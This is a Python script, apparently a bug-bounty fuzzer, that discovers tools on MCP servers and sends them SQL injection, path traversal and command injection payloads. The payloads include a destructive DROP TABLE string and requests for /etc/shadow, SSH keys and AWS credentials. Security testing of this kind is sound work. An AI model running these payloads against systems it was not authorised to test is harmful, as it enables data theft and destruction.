#!/usr/bin/env python3
"""MCP Server Fuzzer — discover MCP tools and test for auth bypass, argument injection, and tool chaining."""

import argparse
import json
import os
import re
import sys
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

FUZZ_ARGUMENTS = {
    "sqli": {
        "queries": [
            "admin' OR '1'='1",
            "test'; DROP TABLE tools;--",
            "\") OR 1=1 LIMIT 100--",
        ],
        "param_names": ["query", "sql", "search_term", "filter", "username", "email"],
    },
    "path_traversal": {
        "paths": [
            "../../../etc/passwd",
            "../../etc/shadow",
            "../../../root/.ssh/id_rsa",
            "../../../proc/self/environ",
            "../../.aws/credentials",
            "../../../.env",
        ],
        "param_names": ["path", "filename", "file", "source", "destination", "dir", "location"],
    },
    "command_injection": {
        "commands": [
            "ls; cat /etc/passwd",
            "echo test && whoami",
            "ping -c 1 127.0.0.1; id",
            "uname -a",
        ],
        "param_names": ["command", "cmd", "exec", "shell", "query", "args"],
    },
}


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path, "r") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return {}


def load_mcp_urls(urls_file):
    urls = []
    if not urls_file or not os.path.exists(urls_file):
        return urls
    with open(urls_file, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                if not line.startswith("http"):
                    line = "https://" + line
                urls.append(line)
    return urls


def send_jsonrpc(session, url, method, params, timeout, dry_run=False):
    body = {"jsonrpc": "2.0", "id": int(time.time() * 1000) % 2147483647, "method": method, "params": params}
    if dry_run:
        print(f"[dry-run] Would send JSONRPC to {url}: {json.dumps(body)[:120]}", file=sys.stderr)
        return {}, True

    try:
        resp = session.post(url, json=body, timeout=timeout)
        if resp.status_code == 200:
            try:
                return resp.json(), False
            except json.JSONDecodeError:
                return {"raw_response": resp.text[:500]}, False
        return {"http_status": resp.status_code, "text": resp.text[:300]}, False
    except requests.exceptions.Timeout:
        return {"error": "timeout"}, True
    except requests.exceptions.ConnectionError:
        return {"error": "connection_error"}, True
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}, True


def discover_tools(mcp_url, session, timeout, dry_run):
    if dry_run:
        print(f"[dry-run] Would discover MCP tools on {mcp_url}", file=sys.stderr)
        return {"url": mcp_url, "mcp_detected": True, "tools": [{"name": "example_tool", "description": "test"}]}

    result = {"url": mcp_url, "mcp_detected": False, "tools": [], "error": None}

    data, _ = send_jsonrpc(session, mcp_url, "tools/list", {}, timeout)
    if "result" in data and "tools" in data["result"]:
        result["mcp_detected"] = True
        result["tools"] = data["result"]["tools"]
        print(f"[mcp] {mcp_url}: discovered {len(result['tools'])} tools", file=sys.stderr)
    else:
        if "error" in data:
            result["error"] = data.get("error", {}).get("message", str(data.get("error", "")))
        elif any(k for k in data if k in ("jsonrpc", "id", "result")):
            result["mcp_detected"] = True

    return result


def fuzz_tool(mcp_url, tool, session, timeout, dry_run):
    findings = []
    tool_name = tool.get("name", "unknown")
    tool_input = tool.get("inputSchema", {}).get("properties", {})

    if dry_run:
        return [{"mcp_url": mcp_url, "tool_name": tool_name, "attack_type": "dry-run", "injection_success": False, "finding": None}]

    param_names = list(tool_input.keys())
    if not param_names:
        param_names = ["query", "path", "cmd", "input", "text", "name"]

    for category, cat_data in FUZZ_ARGUMENTS.items():
        payloads = cat_data.get("queries") or cat_data.get("paths") or cat_data.get("commands") or []
        target_params = cat_data.get("param_names", [])

        relevant_params = [p for p in param_names if any(tp in p.lower() for tp in target_params)]
        if not relevant_params:
            relevant_params = param_names[:2]

        for payload in payloads[:2]:
            for pname in relevant_params[:2]:
                args = {pname: payload}
                for other_param in param_names:
                    if other_param not in args:
                        args[other_param] = "test"
                if "id" in args:
                    args["id"] = 1
                if "limit" in args:
                    args["limit"] = 1

                data, is_error = send_jsonrpc(session, mcp_url, "tools/call", {"name": tool_name, "arguments": args}, timeout)

                finding = {
                    "mcp_url": mcp_url,
                    "tool_name": tool_name,
                    "attack_type": category,
                    "arguments_sent": {k: str(v)[:80] for k, v in args.items()},
                    "response": str(data)[:300] if not is_error else "error",
                    "auth_bypass": False,
                    "injection_success": False,
                    "finding": None,
                    "confidence": 0.0,
                }

                resp_str = str(data).lower()
                if category == "sqli" and any(s in resp_str for s in ["sql", "syntax", "error", "mysql", "postgres"]):
                    finding["injection_success"] = True
                    finding["confidence"] = 0.7
                    finding["finding"] = f"Possible SQLi in MCP tool {tool_name} parameter {pname}"
                elif category == "path_traversal" and any(s in resp_str for s in ["root:", "passwd", "shadow", "proc/", "bin/"]):
                    finding["injection_success"] = True
                    finding["confidence"] = 0.85
                    finding["finding"] = f"Path traversal in MCP tool {tool_name}: file content returned"
                elif category == "command_injection" and any(s in resp_str for s in ["uid=", "www-data", "gid=", "root", "admin"]):
                    finding["injection_success"] = True
                    finding["confidence"] = 0.85
                    finding["finding"] = f"Command injection in MCP tool {tool_name}: OS command output returned"

                findings.append(finding)

    return findings


def test_mcp_server(mcp_url, session, timeout, rate_limit, dry_run, outdir):
    all_findings = []
    tool_count = 0

    discovery = discover_tools(mcp_url, session, timeout, dry_run)
    if rate_limit > 0:
        time.sleep(1.0 / rate_limit)

    if not discovery.get("mcp_detected"):
        return [{"url": mcp_url, "mcp_detected": False, "error": discovery.get("error", "no_mcp"), "finding": None}]

    tools = discovery.get("tools", [])
    tool_count = len(tools)

    for tool in tools[:10]:
        findings = fuzz_tool(mcp_url, tool, session, timeout, dry_run)
        all_findings.extend(findings)
        if rate_limit > 0:
            time.sleep(1.0 / rate_limit)

    for finding in all_findings:
        finding["tools_found"] = tool_count

    return all_findings


def main():
    parser = argparse.ArgumentParser(
        description="MCP Fuzzer — discover and test MCP server tools for vulnerabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--mcp-urls", required=True, help="File with MCP endpoint URLs, one per line")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path")
    parser.add_argument("--rate-limit", type=int, default=3, help="Max requests per second (default: 3)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout (default: 15)")
    parser.add_argument("--concurrency", type=int, default=3, help="Thread pool concurrency (default: 3)")
    parser.add_argument("--dry-run", action="store_true", help="Print planned requests without executing")
    parser.add_argument("--user-agent", default="BugBountyAgent/2.0 MCP Fuzz (security research)", help="Custom User-Agent")
    parser.add_argument("--proxy", default=None, help="HTTP proxy")
    args = parser.parse_args()

    ctx = load_context(args.context)
    outdir = ctx.get("outdir", os.getcwd())
    os.makedirs(outdir, exist_ok=True)

    mcp_urls = load_mcp_urls(args.mcp_urls)
    if not mcp_urls:
        print("[error] No MCP URLs loaded from --mcp-urls file.", file=sys.stderr)
        sys.exit(1)

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "ai-llm", "mcp_findings.jsonl")
    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    proxy_dict = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    session = requests.Session()
    session.headers.update({
        "User-Agent": args.user_agent,
        "Content-Type": "application/json",
        "Accept": "application/json,*/*",
    })
    if proxy_dict:
        session.proxies.update(proxy_dict)
    adapter = requests.adapters.HTTPAdapter(max_retries=2)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    print(f"[info] Testing {len(mcp_urls)} MCP endpoints", file=sys.stderr)

    if args.dry_run:
        for url in mcp_urls:
            test_mcp_server(url, session, args.timeout, args.rate_limit, dry_run=True, outdir=outdir)
        print(f"[dry-run] Dry run complete.", file=sys.stderr)
        return

    all_findings = []
    all_results = []

    with open(output_path, "w") as outfile:
        with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
            futures = {}
            for url in mcp_urls:
                future = executor.submit(test_mcp_server, url, session, args.timeout, args.rate_limit, dry_run=False, outdir=outdir)
                futures[future] = url
            for future in as_completed(futures):
                try:
                    results = future.result()
                except Exception as e:
                    print(f"[fatal] Worker error: {e}", file=sys.stderr)
                    continue
                for result in results:
                    result["timestamp"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                    outfile.write(json.dumps(result) + "\n")
                    all_results.append(result)
                    if result.get("finding"):
                        all_findings.append(result)
                        tool = result.get("tool_name", "")
                        print(f"[found] {result.get('mcp_url','')} | tool={tool} | {result.get('attack_type','')}", file=sys.stderr)

    summary = {
        "total_mcp_urls": len(mcp_urls),
        "total_results": len(all_results),
        "findings": len(all_findings),
        "high_confidence": sum(1 for f in all_findings if f.get("confidence", 0) >= 0.7),
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)
    print(f"[done] MCP findings written to {output_path}", file=sys.stderr)


if __name__ == "__main__":
    main()